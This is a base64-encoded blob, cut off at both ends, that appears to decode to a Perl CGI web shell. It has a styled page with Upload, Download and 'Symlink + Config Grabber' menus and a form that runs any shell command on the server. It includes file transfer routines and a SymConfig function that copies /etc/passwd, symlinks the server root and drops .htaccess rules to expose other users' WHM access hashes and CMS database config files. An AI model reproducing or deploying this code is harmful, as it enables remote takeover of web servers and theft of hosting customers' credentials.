dEVqbHFFQ05RSUk0UWpTakRCT0RGcXF4WTM5a0dZa0loU1NpaW10QVczOUZCS0QwWDRJQmtUUkFtQlVFb2dVSHdvRFpnY2V1aWh1QVVmU2crbGNUZDk4OTdLMnNwSlN3L0xMZ052WitidG01MTVQL01OM3BkY284cUVPQTlNWGtuZmVyTTRDSG9wK2g3L0hRcjlIMTZXLytUMWhZblZMTldReGxmenVJR2JkQjFHNWdvY2pPZFRHb0F3QW5hWVg2V2JKdVNuNkxRRGRodGRJejFyWjNWaW9FL2JrajBGKzlWdGkwZ1JsOXJCVVhZV3NiK1hvLzJFK1VqeG5jVlE1TUowM0pITzVQTHBNdG96S09lQTh2Skw2VXVDa2xxNW5IZXNTYzVRTENvV2sxcHBybktNUW5Vb0V4Mis2dWt3b3JSa0RTRFBWSXFrUlhXUWpuUUltblVnL2RmbTRWY2VkTFhkTXRQQjYyYzY5UGRvdEo5UU5na0x3cU83Sm4wSTRRcitrMGdhandwekNzaWVmc3VRL1o4VWtGLy9EVGU1UHpnWGlmSHlNSkpiMFNQNVQ2ZzB2QlBKdjVUSTcyRHJTV2ZzTExKejlKREFUa1NwcTIyN2ZWUjZIOTB0L1ZmcDgyOEhUTExmaStSU0p0a1hONTJKZ2xna1loYVptS3ZTRU8zMEhvWHRKZStqSzlpSHQwamZKeWlTSjdGQnF4QXpibDFUdE5GL21YR0RrY3NkWDkvWWx3dEx1ZXh5UVpZTHk5bmNVa0htMzAxVjV4UTRIcGl1RmhXbFdLVStLUHYwWjN5Zis5YkkrU3B4MndNUXpYakNtcmFESlc2RXZING9vS3FVYWhDTWRjUm53alZEZ2F0ZXhpR3NMUkxKcHA3alVjelAyVXd5bVlFTFhTSWgyL1IwTXBsQ3BlNVRPWjdMeFo5eGdXM0wzQXIvTmY2TStCSXZaM0lmZHFHTGxqdEFFWG1SakVLckR4K3U4aEw2YUViZjByY3VrTFo1MG5hUHRnMTMyN1o0ZFVjNGFrNXJuTFFRREFBQXN4c2dUY2c3VUVqL2FRZVZVR2xHZjAydlFyMFMwb2QzTFRZdUNZaW1DWG9tbjh3b25IRE8xSU1CTnovaEhJeEJ4aHdVbDRpUXFIQ0FFazVwNEtsYUo5bXBaY3VqOW1reTZZSmp5S2N0VVAwbFNmMjBUQVI0SWRYMjJHaWlGYzBPRzM5eE1vT21JcE1hT3pMQkVLR3RZV3RZZEh1Q3lFY2VURHVHNC9MRmRaNWYzNGorK3MzY05UVWNXNTY2M2ZDZ1RiOWU0M24weGttOUUvaTRQbHVMalkxK2N2bUhIMFBvODRZNzdnc28zc2JlOSs2UmpXSFBwemNidmtUQUYzYzN2cndSOEg0d1BQN0xMbHN6aWZLUDhhN3dPMmNsTWZBdFZxbTRQVGlzYVFZMFlndXJYVGhqS0w0bGVWV1dOQ2YyMEJMRmJsbm5iWkdpSllxUU1XZGhXQVFHMXRvWVJSL1k4VEtjV29pT3h5U2EvQWxJcEU1YUtKUG0welBIRnlIeEM4V0FEQ0NZTUVSSWhDZGJJN0lUZTZKb3ZiR0d3cUxET1dTclZSWnFOcWZETHE3eHZNQ1hYeTBLQW8rRjk2OWUxV2ZSdGo2N3RGbS9kazdmUjc2cGFuMXpVYXBjcjA4Y0hFelVyMWNrWnA5Z05CM2NJWllqZDA5QzAyS0hESDhVMjZtMXNwdmhZNU91c0F1YUhCYkEzbEtRKzB2ckpaN2x4am1PMWp5QW1nRHNLNGFReHRRd0wwNjZORmZxOVZablFmVzdGWG1sY25qWTVPUFp1REl6bzhTei9pYlVKdTA4Y0h3b2lUZHJyQ3dwYW1xWmpLYWRQLzlrQWQ4NXZNaStWK3JwQVQ0dytENlhLNW00a3ZBWXFQME10YWJOUHpIcXU3MXluTjFmdThKYThNbDdzY253c0xnaDNQZ2IxNHRMWHdBQUFIamFZMkJrQUlJelp3em5yWGtjejIvemxVR2VBeVRBY082TTZrMEUvVzhKQ3dQYkVpQ1hnNEVKSkFvQW02WU5TSGphWTJCa1lHQmI4cmNJUkRJQUFRc0RBeU1ES25nQkFGRmNBN0o0Mm5XVHNVdkRRQlRHWDFvUlIrbWFvWU1FQndjUndSSkVBaUlkZ2hRSlJSeEtodUlnTGlWSUVjZmc0QkNrWkhGd0ZCRmNIQnlLRlA4TU4yY1J3Y2xaeE8vZGZjVjRhT0RIOS9KeWQrL2RkNWZhdTJ3Sm5wbGZlRWRnRG5FTERFQUFJdVJ1b0s5a0NGTGtWa0FUSE9MOTNPYmtrdDlQUUF6T3VFNE9EaXc2M3RONis1eWorZ2dTME9ENGxEb2grdDREWStaUG1kOEVHVmdIRjlTTTdJQSs4RGx1bFRIbWU3cXZFZmhnM1hua090QmpVTEtuaE9UVWtyWExTdHhsbkZUMG1mdldlUVhZQUl2c0xXYWZWNmgzejNpYjNnOVpWL2Zac2IyYU1RVjliN1BmM05aVjcwM3VrMzZxUjErSWE2REhma0w2SGRtODhlK081N29BbHVoOTR4OWFYSGZpTUhZSUt1ZmdNcUwySFh6dXY2VHZmeEU1WnpGbDRKQlYvSGRKcVlWRHpEa3g5eG5SYzczL0wvVkVaUFphWktxMU5SSHZGdmdXZVlKMm9hazV1K1lQNWw4US9oL0xGdGtEdStSTmErbGNmTU85OE5xNkx2c0k2ZzhtRGlYOEJ1SHFYd1o0Mm1OZ1lOQ0J3eXFHTFl3em1JeVlyakVYTU05aVBzTDhnY1dIcFkvbENNc2pWaEZXRDlaOXJQL1lDdGllc2R1d3YrTkk0bGpBcWNZNWpmTVdseHFYRFZjY1Z3blhJKzR5bmlTZU43d092Rk40TC9DeDhSWHhyZUo3eEsvRW44VGZJY0FoNENVd1QrQ0RZSVRnQ1NFbm9TS2hiY0xIUkd4RXFrUzJpTHdUbFJMMUU2MFFuU2E2VHZTY1dJRFlHckYvNGpIaSt5UUNKSTVKOGtqbVNWNlE0cE1La3RvajlVZmFUM3FOREkrTWk4d0dXUTVaSDlsdGNydmtmc2tYeWE5UUVGRXdVSmlqOEVQaGg2S2I0allsRmFVNXloektlc3FQVkZSVXpxbjZxZWFvVGxIZHBGYWlOa250aGJxWmVvOEdoNGFHUnBYR01ZMHZtbGFhVFpwWE5MOW9WV2p6YVQvUkNkUDEwL1BRZHpISU1weGt0TTJZejNpUzhRMFRPWk1za3dlbWFxWTVwdHZNak14V21ldVo5NWkvc3ZDeXVHV1pZdGxteFdVVlliWENtc0c2enZxUWpaVE5GbHM3MnpOMmNmWVM5aGNjT2h5REhCODUrVGh0YzFaeFB1RWk0Wkxoc3NmVnluV0xtNFhiRkxjUDduN3VEenp5UERaNUduazJlRjd5MHZKYTRhM2gzZWZqNVhQQU44LzNsWitRWHd3T21PVlg0ZGZtTjg5dm05OGJmeVgvQ1A5ZEFWSUJGUUViQWdXQVVDOHdDQWpQQkhrRVpRUXRDYm9GQUdRYmxxTUFBUUFBQU9rQVRRQUZBQUFBQUFBQ0FBRUFBZ0FXQUFBQkFBSEVBQUFBQUhqYW5aSzdTZ05CRkliLzNjUkxVSUlSQ1JZaVU0aWRtNDFHMEZTQ1FTemNSdkRTYmk3R1lDNnlHUkhCd21md0NTeDlBcDlCd2NyS0o3SDJuOW16aXNGRUNVTW0zNXp6bjh2T0hBQTV2Q0VGSjUwQmNNOWZ6QTd5UE1Yc0lvdEg0UlIyOENTY3hpbytoQ2V3NkN3SlQyTEZLUWxQNGM0NUZaN0dzdk11bkNFbnNUTW91UXZDcytSOTRUbmszVnZoSExKdTBzODg3US9DeitTa254ZjQ3aXQyMGNNbGJoQ2hoU2JPb2FHd0RoOUZMa1Z2aUM0VlhYcHI1RFp0QjlUVTRaRU1HM3VEL2o3M09pMVg1RG81SW12bWEvRC9DRlZyMTl3VjltdysvU082Wm5WRlp2VUgxSUZWOTNCSVJaT1dOcnVJaG1qVWdFcmgySGJTWngyalVNenVZV3RvamNINC8wUW5zV3NqT3d6dHJmeCtuMFp0dmo2eThTM1cwN1p1ZkorYUZOb2I3VmpsQmYyS0djNytlSjJLUFd2cFBPQXBaUGJFUDlwcnBrQnpLc29vY0YzYjVkSCtIZE9SQ0k5MWV6d1Z4b29aLzZWUHFLbnlEcEpKaWljbmtPK3AwRnV6ODdrdDAxekdKbC9PN1A3WGZHOThBb3RPbGx3QWVOcHQwRVZzRkhFVXgvSHZhM2U3N2RiZEtlNHlNOXVwNEx0dEIzZDNDclZGV3RpeXVJYmlFZ2dKTndoMkFZSnJJTUFCQ0c1QkFodzQ0K0VBWEdIYStYUGpKUytmdlAvaDkxNytSTkJTZjl4MDVuLzF5VzZSQ0lra0VoZHVvdkFRVFF4ZVlva2puZ1FTU1NLWkZGSkpJNTBNTXNraW14eHl5U09mVmhUUW1qYTBwUjN0NlVCSE90bWJ1dENWYm5TbkJ6M3BoWWFPZ1k5Q1RJb29wb1JTZXRPSHZ2U2pQd01ZaUo4QVpaUlRnY1VnQmpPRW9ReGpPQ01ZeVNoR000YXhqR004RTVqSUpDWXpoYWxNWXpvem1Na3NabE1wTG83U3hDWnVzSitQYkdZM096akFjWTZKbSsyOFp5UDdKRW84N0pKb3RuS2JEeExEUVU3d2k1Lzg1Z2luZU1BOVRqT0h1ZXloaWtkVWM1K0hQT014VDNocS8xTU5MM25PQzg1UXl3LzI4b1pYdkthT0wzeGpHL01JTXArRkxLQ2VRelN3bUVXRWFDVE1FcGF5ak04c1p5VXJXTVVhVm5PVnc2eGpMZXZad0ZlK2M0MnpuT002YjNrblhvbVZPSW1YQkVtVUpFbVdGRW1WTkVtWERNbmtQQmU0ekJYdWNKRkwzR1VMSnlXTG05eVNiTWxocCtSS251Ujd3dlZCVGRQS0hYV2xYMU9xT1dBb2ZVcFRXZHFzWVFjb2RhV2g5Q2tMbGFheVNGbXNMRkgreS9NNzZpcFgxNzAxd2Rwd3FMcXFzckhPZVRJc1I5TnlWWVJERFMyRGFaVTFhd1djTzJ5TnZ3NnJtVlFBQUhqYVBjdzlFc0ZBSEFYd2JGWTJrYytOQ1Nvek1YUmJhYlFhU1pQR3FMSXp6bUZHcDFGeUNnZjRSK1VTanVBc1BLenQzdS9ObTNkbnJ4T3hzOU5Rc0drN3hpNjZxNFZxcHlSMVE4VVc0YWduSk5TdWRZaVhGWEcxSmxGV04vNTAxUmNlSUs0R1BjQTdHUGlmMmNNZ0FQeWhRUjhJc2g4WWhlWTJRaHRLVjNXODNvTXhHSTBzRXpCZVdhWmdzckRNd0hSdUtjRnNacG1EY213NUFQUGxuNW9LOVFiaUJrcXNBQUFCVXFaMVdnQUEpIGZvcm1hdCgnd29mZicpOw0KICAgIGZvbnQtd2VpZ2h0OiBub3JtYWw7DQogICAgZm9udC1zdHlsZTogbm9ybWFsOw0KDQp9DQoNCmJvZHkgew0KZm9udC1mYW1pbHk6ICJ1YnVudHVfbW9ub3JlZ3VsYXIiOw0KZm9udC1zaXplOjEycHg7DQpiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0Ow0KYmFja2dyb3VuZC1hdHRhY2htZW50OiBmaXhlZDsNCmJhY2tncm91bmQtcG9zaXRpb246IGNlbnRlcjsNCmJhY2tncm91bmQtY29sb3I6IzJkMmIyYjsNCmNvbG9yOmxpbWU7DQpiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsNCn0NCiNuYXZ7cG9zaXRpb246Zml4ZWQ7ei1pbmRleDo5OTk7dG9wOjA7d2lkdGg6MTAwJTtsZWZ0OjcwJTsNCn0NCmEubmF2LWZva3VzIHtkaXNwbGF5OmJsb2NrOyB3aWR0aDphdXRvOyBoZWlnaHQ6YXV0bzsgYmFja2dyb3VuZDojMTkxOTE5OyBib3JkZXItdG9wOjBweDsgYm9yZGVyLWxlZnQ6IDFweCBzb2xpZCAjZmZmOyBib3JkZXItcmlnaHQ6MXB4IHNvbGlkICNmZmY7ICBib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZmZmOyAgcGFkZGluZzo1cHggOHB4OyB0ZXh0LWFsaWduOmNlbnRlcjsgdGV4dC1kZWNvcmF0aW9uOm5vbmU7IGNvbG9yOnJlZDsgbGluZS1oZWlnaHQ6MjBweDsgb3ZlcmZsb3c6aGlkZGVuOyBmbG9hdDpsZWZ0Ow0KfQ0KYS5uYXYtZm9rdXM6aG92ZXIge2NvbG9yOiNGRkZGRkY7IGJhY2tncm91bmQ6IzE5MTkxOTsgYm9yZGVyLXRvcDowcHg7IGJvcmRlci1sZWZ0OiAxcHggc29saWQgI2ZmZjsgYm9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjZmZmOyAgYm9yZGVyLWJvdHRvbToxcHggc29saWQgI2ZmZjsNCn0NCmlucHV0W3R5cGU9dGV4dF17DQoJYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IA0KCWNvbG9yOndoaXRlOw0KCW1hcmdpbjowIDEwcHg7DQoJZm9udC1mYW1pbHk6SG9tZW5hamU7DQoJZm9udC1zaXplOjEzcHg7DQoJYm9yZGVyOm5vbmU7DQp9DQppbnB1dFt0eXBlPXN1Ym1pdF0gew0KCWJhY2tncm91bmQ6IGJsYWNrOyANCgljb2xvcjp3aGl0ZTsNCgltYXJnaW46MCAxMHB4Ow0KCWZvbnQtZmFtaWx5OkhvbWVuYWplOw0KCWZvbnQtc2l6ZToxM3B4Ow0KCWJvcmRlcjpub25lOw0KDQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IjJkMmIyYiIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4NCjxkaXYgaWQ9Im5hdiI+DQo8YSBjbGFzcz0ibmF2LWZva3VzIiBocmVmPSIkU2NyaXB0TG9jYXRpb24/Ij48Yj5Ib21lPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWhlbHAiPjxiPkhlbHA8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkIj48Yj5VcGxvYWQ8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQiPjxiPkRvd25sb2FkPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXN5bWNvbmZpZyI+PGI+U3ltbGluayArIENvbmZpZyBHcmFiYmVyPC9iPjwvYT48L2Rpdj4NCjxicj4NCjxmb250IGNvbG9yPSJsaW1lIiBzaXplPSIzIj4NCkVORA0KfQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KcHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCnN1YiBHZXRDb29raWVzDQp7DQpAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCnsNCigkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCiRDb29raWVzeyRpZH0gPSAkdmFsOw0KfQ0KfQ0KDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQogICAgcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSI/Ij4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iYyI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGNlbnRlcj48YnI+DQo8Zm9udCBjb2xvcj1saW1lPjxiPjxpPjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvaT48L2I+PC9mb250PjwvY2VudGVyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGJyPjxjZW50ZXI+PGZvbnQgY29sb3I9bGltZT48Yj48aT48Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiA8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPg0KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+DQpVcGxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+PC9pPjwvYj48L2ZvbnQ+DQo8L2NlbnRlcj4NCjwvY29kZT4NCkVORA0KfQ0KDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCmlmKCEkV2luTlQpDQp7DQphbGFybSgwKTsNCnByaW50IDw8RU5EOw0KPC94bXA+DQo8Y29kZT4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4NCjxicj5LaWxsZWQgaXQhDQo8Y29kZT4NCkVORA0KJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KZXhpdDsNCn0NCn0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KICAgaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KICAgIHsNCiAgICAgICAgIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KICAgICAgICAjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCiAgICAgICANCiAgICAgICAgJE9sZERpciA9ICRDdXJyZW50RGlyOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQogICAgICAgIGNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7DQogICAgICAgIHByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7DQogICAgfQ0KICAgIGVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KICAgIHsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCiAgICAgICAgcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQogICAgICAgIGlmKCEkV2luTlQpDQogICAgICAgIHsNCiAgICAgICAgICAgICRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQogICAgICAgICAgICBhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQogICAgICAgIH0NCiAgICAgICAgaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KICAgICAgICB7DQogICAgICAgICAgICAkfD0xOw0KICAgICAgICAgICAgJENvbW1hbmQgLj0gIiB8IjsNCiAgICAgICAgICAgIG9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KICAgICAgICAgICAgd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRfID1+IHMvKFxufFxyXG4pJC8vOw0KICAgICAgICAgICAgICAgIHByaW50ICIkX1xuIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICR8PTA7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQogICAgICAgIHsNCiAgICAgICAgICAgIHByaW50IGAkQ29tbWFuZGA7DQogICAgICAgIH0NCiAgICAgICAgaWYoISRXaW5OVCkNCiAgICAgICAgew0KICAgICAgICAgICAgYWxhcm0oMCk7DQogICAgICAgIH0NCiAgICAgICAgcHJpbnQgIjwveG1wPiI7DQogICAgfQ0KICAgICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KICAgICZQcmludFBhZ2VGb290ZXI7DQp9DQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQpsb2NhbCgkRmlsZVVybCkgPSBAXzsNCmlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0Kew0KIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCiZQcmludFBhZ2VIZWFkZXIoImMiKTsNCnByaW50IDw8RU5EOw0KPGNvZGU+DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4uDQo8L2NvZGU+DQpFTkQNCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCmVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCnByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCnN1YiBTeW1Db25maWcNCnsNCiMhL3Vzci9iaW4vcGVybCAtSS91c3IvbG9jYWwvYmFuZG1pbg0KdXNlIEZpbGU6OkNvcHk7IHVzZSBzdHJpY3Q7IHVzZSB3YXJuaW5nczsgdXNlIE1JTUU6OkJhc2U2NDsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCmlmICghLWUgJGZpbGVuYW1lKSB7IGNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCn0NCm1rZGlyICJzeW1saW5rX2NvbmZpZyI7DQpzeW1saW5rKCIvIiwic3ltbGlua19jb25maWcvcm9vdCIpOw0KbXkgJGh0YWNjZXNzID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtRV1JrVkhsd1pTQjBaWGgwTDNCc1lXbHVJQzV3YUhBZ0RRcEJaR1JJWVc1a2JHVnlJSFJsZUhRdmNHeGhhVzRnTG5Cb2NBMEtVMkYwYVhObWVTQkJibmtOQ2tsdVpHVjRUM0IwYVc5dWN5QXJRMmhoY25ObGREMVZWRVl0T0NBclJtRnVZM2xKYm1SbGVHbHVaeUFyU1dkdWIzSmxRMkZ6WlNBclJtOXNaR1Z5YzBacGNuTjBJQ3RZU0ZSTlRDQXJTRlJOVEZSaFlteGxJQ3RUZFhCd2NtVnpjMUoxYkdWeklDdFRkWEJ3Y21WemMwUmxjMk55YVhCMGFXOXVJQ3RPWVcxbFYybGtkR2c5S2lBTkNrbHVaR1Y0U1dkdWIzSmxJQ291ZEhoME5EQTBEUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLbk41Yld4cGJtdGZZMjl1Wm1sbklGdE9RMTBOQ2xKbGQzSnBkR1ZTZFd4bElGd3VkSGgwSkNBbGUxSkZVVlZGVTFSZlZWSkpmVFF3TkNCYlRDeFNQVE13TWk1T1ExMD0iKTsNCm15ICR4c3ltNDA0ID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtTR1ZoWkdWeVRtRnRaU0J3Y0hFdWRIaDBEUXBUWVhScGMyWjVJRUZ1ZVEwS1NXNWtaWGhQY0hScGIyNXpJRWxuYm05eVpVTmhjMlVnUm1GdVkzbEpibVJsZUdsdVp5QkdiMnhrWlhKelJtbHljM1FnVG1GdFpWZHBaSFJvUFNvZ1JHVnpZM0pwY0hScGIyNVhhV1IwYUQwcUlGTjFjSEJ5WlhOelNGUk5URkJ5WldGdFlteGxEUXBKYm1SbGVFbG5ibTl5WlNBcSIpOw0Kb3BlbihteSAkZmgxLCAnPicsICdzeW1saW5rX2NvbmZpZy8uaHRhY2Nlc3MnKTsgcHJpbnQgJGZoMSAiJGh0YWNjZXNzIjsgY2xvc2UgJGZoMTsgb3BlbihteSAkeHgsICc+JywgJ3N5bWxpbmtfY29uZmlnL25lbXUudHh0Jyk7IHByaW50ICR4eCAiJHhzeW00MDQiOyBjbG9zZSAkeHg7IG9wZW4obXkgJGZoLCAnPDplbmNvZGluZyhVVEYtOCknLCAkZmlsZW5hbWUpOyB3aGlsZSAobXkgJHJvdyA9IDwkZmg+KSB7IG15IEBtYXRjaGVzID0gJHJvdyA9fiAvKC4qPyk6eDovZzsgbXkgJHVzZXJueWEgPSAkMTsgbXkgQGFycmF5ID0gKCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvLmFjY2Vzc2hhc2gnLCB0eXBlID0+ICdXSE0tYWNjZXNzaGFzaCcgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsIHR5cGUgPT4gJ0xva29tZWRpYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywgdHlwZSA9PiAnQmFsaXRiYW5nJyB9LCB7Y29uZmlnZGly